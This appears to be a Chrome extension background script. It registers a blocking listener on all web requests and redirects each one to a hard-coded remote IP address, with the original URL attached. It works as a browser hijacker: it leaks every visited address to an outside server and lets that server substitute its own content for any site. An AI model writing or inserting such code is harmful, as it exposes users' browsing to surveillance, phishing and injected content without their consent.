function callback(details)
{
	return {redirectUrl:"http://52.37.162.165:1234/site?url="+details.url}
}
chrome.webRequest.onBeforeRequest.addListener(callback,{},["blocking"]
);
